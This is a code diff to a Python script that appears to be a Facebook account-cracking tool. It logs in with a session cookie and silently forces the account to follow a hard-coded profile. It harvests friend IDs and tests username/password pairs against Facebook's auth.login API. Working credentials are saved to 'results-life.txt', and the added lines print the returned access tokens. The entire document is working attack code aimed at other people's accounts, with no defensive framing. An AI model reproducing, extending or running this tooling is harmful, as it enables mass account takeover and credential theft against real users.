@@ -27,12 +27,15 @@ def masuk():
         cek = {"cookie":cek}
         ismi = ses.get(mbasic.format("/me",verify=False),cookies=cek).content
         if "mbasic_logout_button" in str(ismi):
-                if "Lihat Berita Lain" in str(ismi):
+                if "Apa yang Anda pikirkan sekarang" in str(ismi):
                         with open("cookies","w") as f:
                                 f.write(cek["cookie"])
                 else:
                         print("# Change the language, please wait!!")
-                        requests.get(mbasic.format(parser(ismi,"html.parser").find("a",string="Bahasa Indonesia")["href"]),cookies=cek)
+                        try:
+                                requests.get(mbasic.format(parser(ismi,"html.parser").find("a",string="Bahasa Indonesia")["href"]),cookies=cek)
+                        except:
+                                pass
                 try:
                         # please don't remove this or change
                         ikuti = parser(requests.get(mbasic.format("/zettamus.zettamus.3"),cookies=cek).content,"html.parser").find("a",string="Ikuti")["href"]
@@ -58,6 +61,7 @@ def login(username,password):
         api = 'https://b-api.facebook.com/method/auth.login'
         response = requests.get(api, params=params)
         if 'EAAA' in response.text:
+                print(response.text)
                 result += 1
                 with open('results-life.txt','a') as f:
                         f.write(username + '|' + password + '\n')
@@ -78,7 +82,7 @@ def getid(url):
                         continue
                 else:
                         id.append(x[1] + '|' + x[0].split('/')[1].split('?')[0])
-                print('\r # ' + str(len(id)) + " retrieved",end="")
+                print('\r# ' + str(len(id)) + " retrieved",end="")
         if 'Lihat Teman Lain' in str(raw):
                 getid(mbasic.format(parser(raw,'html.parser').find('a',string='Lihat Teman Lain')['href']))
         return id
